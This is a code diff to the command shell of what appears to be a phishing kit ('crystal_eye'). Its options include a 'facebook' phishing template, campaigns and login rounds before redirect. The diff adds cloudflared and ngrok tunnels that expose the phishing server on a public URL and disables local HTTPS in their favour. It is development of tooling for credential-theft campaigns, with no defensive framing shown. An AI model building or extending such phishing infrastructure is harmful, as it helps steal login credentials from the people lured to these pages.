@@ -155,6 +155,19 @@ class CommandRegistry:
                 self.shell.init_campaign_db()
                 self.shell.console.print(f"[dim]New campaign created: {config.campaign_dir}[/dim]")
 
+        elif key == "tunnel":
+            allowed = ("cloudflared", "ngrok", "none", "off")
+            if value.lower() not in allowed:
+                self.shell.console.print(
+                    f"[red]Unknown tunnel provider:[/red] {value}\n"
+                    "[dim]Available: cloudflared, ngrok, none[/dim]"
+                )
+                return
+            if value.lower() in ("none", "off"):
+                config.tunnel = None
+            else:
+                config.tunnel = value.lower()
+
         else:
             setattr(config, key, value)
 
@@ -254,6 +267,7 @@ class CommandRegistry:
             return
 
         if self.shell.config.campaign == name:
+            self._stop_tunnel()
             if self.shell.server_runner and self.shell.server_runner.is_running:
                 self.shell.server_runner.stop()
                 self.shell.server_runner = None
@@ -289,6 +303,11 @@ class CommandRegistry:
             )
             return
 
+        # Tunnel handles TLS — force local HTTPS off to avoid cert issues
+        if config.tunnel and config.use_https:
+            config.use_https = False
+            self.shell.console.print("[dim]HTTPS disabled (tunnel handles TLS).[/dim]")
+
         if not self._require_campaign():
             return
 
@@ -320,13 +339,75 @@ class CommandRegistry:
         self.shell.console.print(
             f"\n[green]Server started on {protocol}://{config.host}:{config.port}[/green]"
         )
-        self.shell.console.print("[dim]Waiting for connections...[/dim]\n")
+
+        # Start tunnel if configured
+        if config.tunnel:
+            self._start_tunnel(config)
+        else:
+            self.shell.console.print("[dim]Waiting for connections...[/dim]\n")
+
+    def _start_tunnel(self, config) -> None:
+        """Start a tunnel provider and display the public URL."""
+        from crystal_eye.tunnel.cloudflared import CloudflaredTunnel
+        from crystal_eye.tunnel.ngrok import NgrokTunnel
+
+        providers = {
+            "cloudflared": CloudflaredTunnel,
+            "ngrok": NgrokTunnel,
+        }
+
+        cls = providers.get(config.tunnel)
+        if cls is None:
+            self.shell.console.print(f"[red]Unknown tunnel provider:[/red] {config.tunnel}")
+            return
+
+        tunnel = cls()
+        if not tunnel.is_installed():
+            self.shell.console.print(
+                "[red]cloudflared is not installed.[/red]\n"
+                "[dim]Install it:[/dim]\n"
+                "  [dim]Arch:[/dim]   sudo pacman -S cloudflared\n"
+                "  [dim]macOS:[/dim]  brew install cloudflare/cloudflare/cloudflared\n"
+                "  [dim]Debian:[/dim] curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -o cloudflared.deb && sudo dpkg -i cloudflared.deb\n"
+                "  [dim]Other:[/dim]  https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
+            )
+            return
+
+        # ngrok requires an auth token
+        if config.tunnel == "ngrok" and not config.token:
+            self.shell.console.print(
+                "[red]ngrok token not set.[/red] "
+                "Run: [bold]set token <your-ngrok-token>[/bold]\n"
+                "[dim]Sign up at https://ngrok.com to get your token.[/dim]"
+            )
+            return
+
+        self.shell.console.print(f"[dim]Starting {tunnel.name} tunnel...[/dim]")
+
+        try:
+            protocol = "https" if config.use_https else "http"
+            public_url = tunnel.start(config.port, protocol, auth_token=config.token)
+            self.shell.tunnel = tunnel
+            self.shell.console.print(
+                f"[green]Tunnel active:[/green] [bold]{public_url}[/bold]\n"
+            )
+        except RuntimeError as e:
+            self.shell.console.print(f"[red]Tunnel failed:[/red] {e}")
+            self.shell.console.print("[dim]Server is still running locally.[/dim]\n")
+
+    def _stop_tunnel(self) -> None:
+        """Stop the tunnel if running."""
+        if self.shell.tunnel and self.shell.tunnel.is_running:
+            self.shell.tunnel.stop()
+            self.shell.tunnel = None
+            self.shell.console.print("[yellow]Tunnel stopped.[/yellow]")
 
     def do_stop(self) -> None:
         if not self.shell.server_runner or not self.shell.server_runner.is_running:
             self.shell.console.print("[yellow]No server is running.[/yellow]")
             return
 
+        self._stop_tunnel()
         self.shell.server_runner.stop()
         self.shell.server_runner = None
         self.shell.console.print("[yellow]Server stopped.[/yellow]")
@@ -438,6 +519,8 @@ class CommandRegistry:
             [
                 ("campaign", "Set or create a campaign by name"),
                 ("template", "Phishing template to use (e.g. facebook)"),
+                ("tunnel", "Tunnel provider (cloudflared, ngrok, none)"),
+                ("token", "Auth token for ngrok"),
                 ("port", "Server port (default: 8080)"),
                 ("host", "Listen address (default: 0.0.0.0)"),
                 ("max_attempts", "Login rounds before redirect (default: 2)"),
@@ -469,6 +552,7 @@ class CommandRegistry:
         )
 
     def do_exit(self) -> None:
+        self._stop_tunnel()
         if self.shell.server_runner and self.shell.server_runner.is_running:
             self.shell.server_runner.stop()
             self.shell.console.print("[yellow]Server stopped.[/yellow]")
